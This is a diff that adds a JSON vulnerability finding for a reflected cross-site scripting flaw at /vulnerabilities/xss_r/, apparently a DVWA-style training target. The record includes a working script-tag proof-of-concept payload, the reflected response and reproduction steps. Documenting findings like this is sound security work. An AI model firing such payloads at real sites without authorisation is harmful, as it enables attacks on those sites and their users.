@@ -1,0 +1,10 @@
+{
+  "title": "Cross-Site Scripting (XSS) - Reflected",
+  "severity": "High",
+  "location": "/vulnerabilities/xss_r/",
+  "proof": "GET /vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E&Submit=Submit returned '<pre>Hello <script>alert(1)</script></pre>' - the script tag is reflected verbatim in the response inside a pre tag with no sanitization or encoding.",
+  "poc_steps": [
+    "GET /vulnerabilities/xss_r/?name=<script>alert(1)</script>&Submit=Submit",
+    "Observe script tag rendered directly in the HTML response"
+  ]
+}
